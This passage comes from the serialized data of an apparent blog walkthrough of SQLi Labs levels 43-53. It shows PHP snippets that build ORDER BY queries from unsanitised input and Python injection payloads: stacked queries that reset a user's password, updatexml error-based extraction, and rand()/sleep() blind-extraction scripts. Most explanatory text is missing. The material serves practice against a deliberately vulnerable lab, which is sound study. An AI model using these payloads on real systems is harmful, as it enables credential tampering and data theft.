punctuation\">)</span>\n"}}]}]]}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Python"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"payload = \"x'); UPDATE security.users SET password='hacked-L43' WHERE id='1'; -- \"\nresp = query_post(\"Less-43/login.php\", data={\"login_user\": \"x\", \"login_password\": payload})\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"payload <span class=\"token operator\">=</span> <span class=\"token string\">\"x'); UPDATE security.users SET password='hacked-L43' WHERE id='1'; -- \"</span>\nresp <span class=\"token operator\">=</span> query_post<span class=\"token punctuation\">(</span><span class=\"token string\">\"Less-43/login.php\"</span><span class=\"token punctuation\">,</span> data<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token string\">\"login_user\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"x\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"login_password\"</span><span class=\"token punctuation\">:</span> payload<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n"}}]}]]}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Python"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"payload = \"x'; UPDATE security.users SET password='hacked-L44' WHERE id='1'; -- \"\nresp = query_post(\"Less-44/login.php\", data={\"login_user\": \"x\", \"login_password\": payload})\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"payload <span class=\"token operator\">=</span> <span class=\"token string\">\"x'; UPDATE security.users SET password='hacked-L44' WHERE id='1'; -- \"</span>\nresp <span class=\"token operator\">=</span> query_post<span class=\"token punctuation\">(</span><span class=\"token string\">\"Less-44/login.php\"</span><span class=\"token punctuation\">,</span> data<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token string\">\"login_user\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"x\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"login_password\"</span><span class=\"token punctuation\">:</span> payload<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n"}}]}]]}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Python"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"payload = \"x'); UPDATE security.users SET password='hacked-L45' WHERE id='1'; -- \"\nresp = query_post(\"Less-45/login.php\", data={\"login_user\": \"x\", \"login_password\": payload})\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"payload <span class=\"token operator\">=</span> <span class=\"token string\">\"x'); UPDATE security.users SET password='hacked-L45' WHERE id='1'; -- \"</span>\nresp <span class=\"token operator\">=</span> query_post<span class=\"token punctuation\">(</span><span class=\"token string\">\"Less-45/login.php\"</span><span class=\"token punctuation\">,</span> data<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token string\">\"login_user\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"x\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"login_password\"</span><span class=\"token punctuation\">:</span> payload<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n"}}]}]]}],["$","h2",null,{"className":"x-h1","children":"ORDER BYL46-L53"}],["$","h3",null,{"className":"x-h2","children":" & "}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">ORDER BY</code>"}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"SQL"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"SELECT * FROM users ORDER BY 2; -- 2\nSELECT * FROM users ORDER BY rand(); -- \nSELECT * FROM users ORDER BY username; -- \nSELECT * FROM users ORDER BY username ASC, id DESC; -- ID\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$2a"}}]}]]}],["$","h4",null,{"className":"x-h3","children":"1"}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":""}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"SQL"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"SELECT * FROM users ORDER BY if(cond, id, username);\nSELECT * FROM users ORDER BY rand(cond);\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"<span class=\"token keyword\">SELECT</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">FROM</span> users <span class=\"token keyword\">ORDER</span> <span class=\"token keyword\">BY</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>cond<span class=\"token punctuation\">,</span> id<span class=\"token punctuation\">,</span> username<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">SELECT</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">FROM</span> users <span class=\"token keyword\">ORDER</span> <span class=\"token keyword\">BY</span> rand<span class=\"token punctuation\">(</span>cond<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">ORDER BY rand()</code><code class=\"x-inline-highlight\">rand()</code>"}}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"MySQL<code class=\"x-inline-highlight\">rand()</code><code class=\"x-inline-highlight\">rand(seed)</code><code class=\"x-inline-highlight\">cond</code><code class=\"x-inline-highlight\">0</code><code class=\"x-inline-highlight\">1</code>"}}],["$","h4",null,{"className":"x-h3","children":"2"}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"SQL"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"SELECT * FROM users ORDER BY '...', sleep(1);\nSELECT * FROM users ORDER BY '...' OR sleep(1);\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"<span class=\"token keyword\">SELECT</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">FROM</span> users <span class=\"token keyword\">ORDER</span> <span class=\"token keyword\">BY</span> <span class=\"token string\">'...'</span><span class=\"token punctuation\">,</span> sleep<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">SELECT</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">FROM</span> users <span class=\"token keyword\">ORDER</span> <span class=\"token keyword\">BY</span> <span class=\"token string\">'...'</span> <span class=\"token operator\">OR</span> sleep<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n"}}]}]]}],["$","div",null,{"className":"x-highlightblock highlight-background-golden","children":["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">SELECT * FROM users ORDER BY '...' OR sleep(1);</code><code class=\"x-inline-highlight\">ORDER BY</code><code class=\"x-inline-highlight\">'...' OR sleep(1)</code>"}}]}],["$","div",null,{"className":"x-highlightblock highlight-background-golden","children":["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">ORDER BY sleep(1)</code><code class=\"x-inline-highlight\">sleep(1)</code><code class=\"x-inline-highlight\">N</code><code class=\"x-inline-highlight\">N</code>"}}]}],["$","h4",null,{"className":"x-h3","children":"3"}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":""}}],["$","h3",null,{"className":"x-h2","children":"L46"}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"PHP"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"$$sort = $_GET['sort'];\n$sql = \"SELECT * FROM users ORDER BY $sort\";\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"<span class=\"token variable\">$sort</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'sort'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$sql</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"SELECT * FROM users ORDER BY <span class=\"token interpolation\"><span class=\"token variable\">$sort</span></span>\"</span><span class=\"token punctuation\">;</span>\n"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":""}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Python"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"payload = \"?sort=updatexml(null,concat(0x7e,(SELECT database()),0x7e),null) -- \""}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"payload <span class=\"token operator\">=</span> <span class=\"token string\">\"?sort=updatexml(null,concat(0x7e,(SELECT database()),0x7e),null) -- \"</span>"}}]}]]}],["$","$L10",null,{"src":"L46.jpg","width":"100%"}],["$","h3",null,{"className":"x-h2","children":"L47"}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"PHP"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"$$sort = $_GET['sort'];\n$sql = \"SELECT * FROM users ORDER BY '$sort'\";\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"<span class=\"token variable\">$sort</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'sort'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$sql</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"SELECT * FROM users ORDER BY '<span class=\"token interpolation\"><span class=\"token variable\">$sort</span></span>'\"</span><span class=\"token punctuation\">;</span>\n"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":""}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Python"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"payload = \"?sort=x' OR updatexml(null,concat(0x7e,(SELECT database()),0x7e),null) -- \""}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"payload <span class=\"token operator\">=</span> <span class=\"token string\">\"?sort=x' OR updatexml(null,concat(0x7e,(SELECT database()),0x7e),null) -- \"</span>"}}]}]]}],["$","h3",null,{"className":"x-h2","children":"L48"}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"PHP"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"$$sort = $_GET['sort'];\n$sql = \"SELECT * FROM users ORDER BY $sort\";\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"<span class=\"token variable\">$sort</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'sort'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$sql</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"SELECT * FROM users ORDER BY <span class=\"token interpolation\"><span class=\"token variable\">$sort</span></span>\"</span><span class=\"token punctuation\">;</span>\n"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":""}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Python"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"payload = \"?sort=rand(substr(database(),1,1)='!') -- \"\nresp = query_get(\"Less-48\", payload)\nhash_false = sha256(resp.text.encode()).hexdigest()\n\n\ndef test(payload):\n    resp = query_get(\"Less-48\", payload)\n    hash_resp = sha256(resp.text.encode()).hexdigest()\n    print(payload, \":\", hash_resp != hash_false)\n\n\ntest(\"?sort=rand(substr(database(),1,1)='?') -- \")  # False\ntest(\"?sort=rand(substr(database(),1,1)='s') -- \")  # True\ntest(\"?sort=rand(substr(database(),2,1)='e') -- \")  # True\ntest(\"?sort=rand(substr(database(),3,1)='c') -- \")  # True\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$2b"}}]}]]}],["$","h3",null,{"className":"x-h2","children":"L49"}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"PHP"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"$$sort = $_GET['sort'];\n$sql = \"SELECT * FROM users ORDER BY '$sort'\";\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"<span class=\"token variable\">$sort</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'sort'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$sql</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"SELECT * FROM users ORDER BY '<span class=\"token interpolation\"><span class=\"token variable\">$sort</span></span>'\"</span><span class=\"token punctuation\">;</span>\n"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":""}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Python"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"payload = \"?sort=x' OR rand(999) < rand(substr(database(),1,1)='!') -- \"\nresp = query_get(\"Less-49\", payload)\nhash_false = sha256(resp.text.encode()).hexdigest()\n\n\ndef test(payload):\n    resp = query_get(\"Less-49\", payload)\n    hash_resp = sha256(resp.text.encode()).hexdigest()\n    print(payload, \":\", hash_resp != hash_false)\n\n\ntest(\"?sort=x' OR rand(999) < rand(substr(database(),1,1)='?') -- \")  # False\ntest(\"?sort=x' OR rand(999) < rand(substr(database(),1,1)='s') -- \")  # True\ntest(\"?sort=x' OR rand(999) < rand(substr(database(),2,1)='e') -- \")  # True\ntest(\"?sort=x' OR rand(999) < rand(substr(database(),3,1)='c') -- \")  # True\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$2c"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">sort</code><code class=\"x-inline-highlight\">ORDER BY 'x' OR rand(999) &#60; rand(...)</code><code class=\"x-inline-highlight\">'x' OR rand(999) &#60; rand(...)</code>"}}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">'x'</code>MySQL<code class=\"x-inline-highlight\">0</code><code class=\"x-inline-highlight\">OR</code><code class=\"x-inline-highlight\">rand(999) &#60; rand(...)</code><code class=\"x-inline-highlight\">rand(999) &#60; rand(0)</code><code class=\"x-inline-highlight\">rand(999) &#60; rand(1)</code><code class=\"x-inline-highlight\">999</code>"}}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">rand(0)</code><code class=\"x-inline-highlight\">rand(1)</code><code class=\"x-inline-highlight\">rand(999)</code><code class=\"x-inline-highlight\">rand(0)</code><code class=\"x-inline-highlight\">rand(1)</code>"}}],["$","h4",null,{"className":"x-h3","children":""}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Python"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"# ?sort=x' OR sleep(if(substr(database(),1,1)='!', 0.3, 0)) --+"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"<span class=\"token comment\"># ?sort=x' OR sleep(if(substr(database(),1,1)='!', 0.3, 0)) --+</span>"}}]}]]}],["$","h3",null,{"className":"x-h2","children":"L50-L53"}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">mysqli_multi_query</code>"}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"PHP"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"$$sort = $_GET['sort'];\n$sql = \"SELECT * FROM users ORDER BY $sort\"; // BY '$sort'\"\nif (mysqli_multi_query($con1, $sql)) {\n    // ...\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$2d"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"L52L53L50L51"}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Python"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"payload = \"?sort=1; UPDATE security.users SET password='hacked-L50' WHERE id='1'; -- \"\npayload = \"?sort=1'; UPDATE security.users SET password='hacked-L51' WHERE id='1'; -- \"\npayload = \"?sort=1; UPDATE security.users SET password='hacked-L52' WHERE id='1'; -- \"\npayload = \"?sort=1'; UPDATE security.users SET password='hacked-L53' WHERE id='1'; -- \"\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"payload <span class=\"token operator\">=</span> <span class=\"token string\">\"?sort=1; UPDATE security.users SET password='hacked-L50' WHERE id='1'; -- \"</span>\npayload <span class=\"token operator\">=</span> <span class=\"token string\">\"?sort=1'; UPDATE security.users SET password='hacked-L51' WHERE id='1'; -- \"</span>\npayload <span class=\"token operator\">=</span> <span class=\"token string\">\"?sort=1; UPDATE security.users SET password='hacked-L52' WHERE id='1'; -- \"</span>\npayload <span class=\"token operator\">=</span> <span class=\"token string\">\"?sort=1'; UPDATE security.users SET password='hacked-L53' WHERE id='1'; -- \"</span>\n"}}]}]]}]]
d:[["$","meta","0",{"name":"viewport","content":"width=device-width, initial-scale=1"}],["$","meta","1",{"charSet":"utf-8"}],["$","title","2",{"children":"SQLi Labs - "}],["$","link","3",{"rel":"canonical","href":"https://1kuzus.github.io/25d/sqli-labs/"}]]
1:null
